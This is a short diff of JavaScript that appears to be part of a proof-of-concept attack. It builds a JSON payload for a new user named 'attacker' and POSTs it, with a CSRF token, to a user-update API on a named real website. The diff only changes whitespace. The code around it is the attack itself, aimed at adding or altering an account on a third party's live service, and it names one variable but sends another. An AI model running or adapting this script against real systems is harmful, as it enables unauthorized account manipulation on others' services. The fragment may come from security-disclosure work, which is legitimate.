@@ -24,7 +24,7 @@ const addNew = '{"name":"attacker","email":"johnstone+attacker' + Math.floor(Mat
 const response = fetch('https://www.pangleglobal.com/media/api/user/update', {
   method: 'POST',
   headers: {
-	'Content-Type': 'application/json; charset=utf-8',
+  'Content-Type': 'application/json; charset=utf-8',
   'X-Csrf-Token':csrfToken
   },
   body: JSON.stringify(newProduct),
